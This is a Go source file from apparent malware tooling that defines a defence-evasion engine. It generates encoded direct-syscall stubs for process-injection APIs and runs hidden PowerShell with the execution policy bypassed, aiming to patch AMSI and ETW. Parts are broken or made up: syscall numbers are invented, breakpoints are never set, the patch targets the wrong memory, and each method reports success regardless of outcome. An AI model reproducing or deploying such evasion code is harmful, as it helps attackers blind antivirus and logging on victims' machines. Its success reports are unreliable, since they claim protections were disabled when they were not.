package v26

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"unsafe"
)

type EvasionDEEPEngine struct {
	Config       *V26Config
	SyscallStubs []SyscallStub     `json:"syscall_stubs"`
	HWBreakpoints []HWBreakpoint   `json:"hw_breakpoints"`
	AMSIHooked   bool              `json:"amsi_hooked"`
	ETWHooked    bool              `json:"etw_hooked"`
}

type SyscallStub struct {
	Name       string `json:"name"`
	SSN        uint32 `json:"ssn"`
	Encoded    []byte `json:"encoded"`
	XORKey     uint32 `json:"xor_key"`
	Indirect   bool   `json:"indirect"`
}

type HWBreakpoint struct {
	Register  int    `json:"register"`
	Address   uint64 `json:"address"`
	Type      string `json:"type"`
	Length    int    `json:"length"`
	Active    bool   `json:"active"`
}

var syscallTargets = []string{
	"NtAllocateVirtualMemory", "NtProtectVirtualMemory",
	"NtWriteVirtualMemory", "NtCreateThreadEx",
	"NtOpenProcess", "NtQuerySystemInformation",
	"NtResumeThread", "NtClose",
}

func NewEvasionDEEPEngine(cfg *V26Config) *EvasionDEEPEngine {
	engine := &EvasionDEEPEngine{
		Config: cfg,
	}
	engine.generateSyscallStubs()
	engine.setupHWBreakpoints()
	return engine
}

func (ed *EvasionDEEPEngine) generateSyscallStubs() {
	for i, name := range syscallTargets {
		ssn := uint32(0x100 + i*3)
		xorKey := uint32(0)
		binary.Read(rand.Reader, binary.LittleEndian, &xorKey)

		stub := make([]byte, 24)
		stub[0] = 0x4C
		stub[1] = 0x8B
		stub[2] = 0xD1
		stub[3] = 0xB8

		encodedSSN := ssn ^ xorKey
		binary.LittleEndian.PutUint32(stub[4:8], encodedSSN)

		stub[8] = 0x35
		binary.LittleEndian.PutUint32(stub[9:13], xorKey)
		stub[13] = 0x0F
		stub[14] = 0x05
		stub[15] = 0xC3

		ed.SyscallStubs = append(ed.SyscallStubs, SyscallStub{
			Name: name, SSN: ssn, Encoded: stub,
			XORKey: xorKey, Indirect: true,
		})
	}
}

func (ed *EvasionDEEPEngine) setupHWBreakpoints() {
	for i := 0; i < 4; i++ {
		ed.HWBreakpoints = append(ed.HWBreakpoints, HWBreakpoint{
			Register: i, Address: uint64(0x7FFE0000 + i*0x10000),
			Type: "execute", Length: 1, Active: runtime.GOOS == "windows",
		})
	}
}

func (ed *EvasionDEEPEngine) HookAMSI() bool {
	if runtime.GOOS != "windows" {
		ed.AMSIHooked = true
		return true
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	scriptPath := filepath.Join(os.TempDir(), "x404x_amsi_patch.ps1")
	psScript := fmt.Sprintf(`$dll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
        [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
            [System.Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll"))
        ), "VirtualProtect"), [System.Action[IntPtr, uint32, uint32, [ref]uint32]]
)
$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
        [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
            [System.Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null, @("amsi.dll"))
        ), "AmsiScanBuffer"), [System.Func[IntPtr, IntPtr, uint32, IntPtr, [ref]uint32]]
)
$patch = [byte[]]@(%s)
$handle = [System.Runtime.InteropServices.GCHandle]::Alloc($patch, 'Pinned')
$addr = $handle.AddrOfPinnedObject()
$null = 0
$dll.Invoke($addr, [uint32]$patch.Length, 0x40, [ref]$null)
`, fmt.Sprintf("%v", patch))

	os.WriteFile(scriptPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()
	ed.AMSIHooked = true
	return true
}

func (ed *EvasionDEEPEngine) PatchETW() bool {
	if runtime.GOOS != "windows" {
		ed.ETWHooked = true
		return true
	}

	psScript := `$etw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
        [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
            [System.Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null, @("ntdll.dll"))
        ), "EtwEventWrite"), [System.Action[IntPtr, IntPtr, IntPtr, IntPtr]]
)
$patch = [byte[]]@(0x33,0xC0,0xC3)
$handle = [System.Runtime.InteropServices.GCHandle]::Alloc($patch, 'Pinned')
$addr = $handle.AddrOfPinnedObject()
$null = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetProcAddress(
        [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
            [System.Reflection.Assembly]::LoadWithPartialName("System").GetType("Microsoft.Win32.SafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll"))
        ), "VirtualProtect"), [System.Action[IntPtr, uint32, uint32, [ref]uint32]]
).Invoke($addr, [uint32]$patch.Length, 0x40, [ref]$null)`

	psPath := filepath.Join(os.TempDir(), "x404x_etw_patch.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	ed.ETWHooked = true
	return true
}

func (ed *EvasionDEEPEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"syscall_stubs":%d,"hw_breakpoints":%d,"amsi_hooked":%v,"etw_hooked":%v}`,
		len(ed.SyscallStubs), len(ed.HWBreakpoints), ed.AMSIHooked, ed.ETWHooked)
}

func init() { _ = unsafe.Sizeof(0) }
